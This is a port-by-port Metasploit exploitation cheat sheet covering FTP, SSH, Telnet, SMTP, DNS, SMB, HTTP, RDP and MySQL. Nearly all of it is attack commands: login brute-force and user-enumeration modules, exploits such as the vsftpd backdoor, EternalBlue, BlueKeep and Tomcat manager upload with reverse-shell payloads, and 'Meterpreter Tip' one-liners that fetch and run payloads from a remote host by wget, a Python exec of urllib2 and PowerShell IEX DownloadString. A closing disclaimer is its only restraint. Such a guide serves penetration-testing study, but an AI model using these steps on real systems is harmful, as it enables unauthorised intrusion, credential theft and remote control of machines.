# Enhanced Metasploit Port Exploitation Guide

## Port 21 - FTP
**Service**: File Transfer Protocol  
**Common services**: vsftpd, ProFTPD, FileZilla, Pure-FTPd

### Auxiliary: FTP Login Scanner
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces username and password logins.

### Exploit: vsftpd Backdoor
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST [IP]
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Exploits a backdoor in vsftpd version 2.3.4.

### Meterpreter Tip:
After initial access, upload and execute a Meterpreter payload:
```bash
upload /path/to/meterpreter.elf
chmod +x meterpreter.elf
./meterpreter.elf
```

---

## Port 22 - SSH
**Service**: Secure Shell  
**Common services**: OpenSSH, Dropbear, Tectia SSH

### Auxiliary: SSH Login Scanner
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS [IP]
set USERNAME root
set PASS_FILE /path/to/passwords.txt
set VERBOSE true
```
**Purpose**: The primary method for attacking SSH.

### Auxiliary: SSH User Enumeration
```bash
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS [IP]
set USER_FILE /path/to/usernames.txt
```
**Purpose**: Enumerates valid system usernames on older OpenSSH versions.

### Meterpreter Tip:
After gaining SSH access, download and execute a Meterpreter payload:
```bash
wget http://[IP]/meterpreter.elf -O /tmp/m
chmod +x /tmp/m
/tmp/m
```

---

## Port 23 - Telnet
**Service**: Telnet Protocol  
**Common services**: in.telnetd, Microsoft Telnet, various embedded devices

### Auxiliary: Telnet Login Scanner
```bash
use auxiliary/scanner/telnet/telnet_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces logins on the unencrypted service.

### Exploit: Telnet Encryption Option
```bash
use exploit/linux/telnet/telnet_encrypt_keyid
set RHOST [IP]
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Exploits a vulnerability in the encryption option handling.

### Meterpreter Tip:
After gaining Telnet access, download and execute a Meterpreter payload:
```bash
wget http://[IP]/meterpreter.bin -O /tmp/m
chmod +x /tmp/m
/tmp/m
```

---

## Port 25/465/587 - SMTP
**Service**: Simple Mail Transfer Protocol  
**Common services**: Postfix, Sendmail, Exim, Microsoft Exchange

### Auxiliary: SMTP User Enumeration
```bash
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS [IP]
set USER_FILE /path/to/usernames.txt
```
**Purpose**: Enumerates valid users via VRFY, EXPN, or RCPT TO.

### Exploit: Exim RCE
```bash
use exploit/linux/smtp/exim4_deliver_message_priv_esc
set RHOST [IP]
set PAYLOAD cmd/unix/reverse_bash
```
**Purpose**: Privilege escalation in specific Exim versions.

### Meterpreter Tip:
After gaining access, download and execute a Meterpreter payload:
```bash
python -c "import urllib2; exec(urllib2.urlopen('http://[IP]/meterpreter.py').read())"
```

---

## Port 53 - DNS
**Service**: Domain Name System  
**Common services**: BIND, Windows DNS, dnsmasq, Unbound

### Auxiliary: DNS Version Detection
```bash
use auxiliary/gather/dns_info
set RHOSTS [IP]
set DOMAIN [DOMAIN]
```
**Purpose**: Gathers version and information.

### Auxiliary: DNS Zone Transfer
```bash
use auxiliary/gather/dns_axfr
set RHOSTS [IP]
set DOMAIN [DOMAIN]
```
**Purpose**: Attempts a zone transfer to dump all DNS records.

### Meterpreter Tip:
DNS typically doesn't provide direct shell access but can be used for:
- Data exfiltration via DNS queries
- Tunneling other protocols through DNS

---

## Port 139/445 - SMB
**Service**: Server Message Block  
**Common services**: Windows File Sharing, Samba, NetBIOS

### Auxiliary: SMB Version Detection
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS [IP]
```
**Purpose**: Discovers OS version and SMB version.

### Auxiliary: SMB Share Enumeration
```bash
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS [IP]
set SMBDomain [DOMAIN]
set SMBUser [USER]
set SMBPass [PASS]
```
**Purpose**: Enumerates available shares.

### Exploit: EternalBlue (MS17-010)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [Your IP]
set LPORT [Port]
```
**Purpose**: Exploits a critical vulnerability in SMBv1 (MS17-010).

### Meterpreter Tip:
SMB exploits often provide direct Meterpreter sessions. For file shares:
```bash
upload /path/to/meterpreter.exe \\share\\meterpreter.exe
psexec -s -c \\share\\meterpreter.exe
```

---

## Port 80/443/8080 - HTTP/HTTPS
**Service**: Hypertext Transfer Protocol (Secure)  
**Common services**: Apache, Nginx, IIS, Tomcat, Web applications

### Auxiliary: HTTP Version Detection
```bash
use auxiliary/scanner/http/http_version
set RHOSTS [IP]
set RPORT [PORT]
```
**Purpose**: The critical first step for all web services.

### Exploit: Tomcat Manager Upload
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST [IP]
set RPORT [PORT]
set HttpUsername [USER]
set HttpPassword [PASS]
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST [Your IP]
set LPORT [Port]
```
**Purpose**: Uploads a malicious WAR file if manager app credentials are known.

### Meterpreter Tip:
For web applications, upload a web shell or use framework-specific exploits:
```bash
generate -f war -p java/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] > shell.war
```

---

## Port 443 - HTTPS
**Service**: HTTP Secure  
**Common services**: SSL/TLS web servers, VPN gateways, secure applications

### Auxiliary: SSL/TLS Version Detection
```bash
use auxiliary/scanner/http/http_ssl
set RHOSTS [IP]
set RPORT 443
```
**Purpose**: Detects SSL/TLS versions and vulnerabilities.

### Exploit: Heartbleed (CVE-2014-0160)
```bash
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS [IP]
set RPORT 443
set VERBOSE true
```
**Purpose**: Exploits OpenSSL Heartbleed vulnerability to leak memory contents.

### Meterpreter Tip:
HTTPS services often require valid certificates for payloads:
```bash
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set StagerVerifySSLCert true
```

---

## Port 3389 - RDP
**Service**: Remote Desktop Protocol  
**Common services**: Windows Terminal Services, xrdp, FreeRDP

### Auxiliary: RDP Login Scanner
```bash
use auxiliary/scanner/rdp/rdp_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces user credentials.

### Auxiliary: BlueKeep Scanner (CVE-2019-0708)
```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS [IP]
set VERBOSE true
```
**Purpose**: Checks for the critical BlueKeep vulnerability.

### Exploit: BlueKeep (CVE-2019-0708)
```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS [IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [Your IP]
set LPORT [Port]
```
**Purpose**: Exploits BlueKeep vulnerability for RCE.

### Meterpreter Tip:
After RDP access, execute Meterpreter from command prompt:
```bash
cmd /c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://[IP]/meterpreter.ps1')"
```

---

## Port 3306 - MySQL
**Service**: MySQL Database  
**Common services**: MySQL, MariaDB, Percona Server

### Auxiliary: MySQL Login Scanner
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS [IP]
set USERPASS_FILE /path/to/wordlist.txt
set VERBOSE true
```
**Purpose**: Bruteforces MySQL credentials.

### Exploit: MySQL UDF Command Execution
```bash
use exploit/windows/mysql/mysql_payload
set RHOST [IP]
set USERNAME [USER]
set PASSWORD [PASS]
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST [Your IP]
set LPORT [Port]
```
**Purpose**: Executes commands via MySQL User Defined Functions.

### Meterpreter Tip:
Use MySQL to write a payload to disk and execute it:
```sql
select @@plugin_dir;
select unhex([HEX_PAYLOAD]) into dumpfile '/path/to/meterpreter.so';
create function sys_exec returns integer soname 'meterpreter.so';
```

---

## Additional Resources

- [Metasploit Documentation](https://docs.metasploit.com/)
- [Nmap - Network Mapper](https://nmap.org/)
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/)
- [CVE Database](https://cve.mitre.org/)
- [GTFOBins - Unix Binaries](https://gtfobins.github.io/)
- [LOLBAS - Windows Binaries](https://lolbas-project.github.io/)

---

**Disclaimer**: This information is for educational purposes and authorized security testing only. Unauthorized access to computer systems is illegal.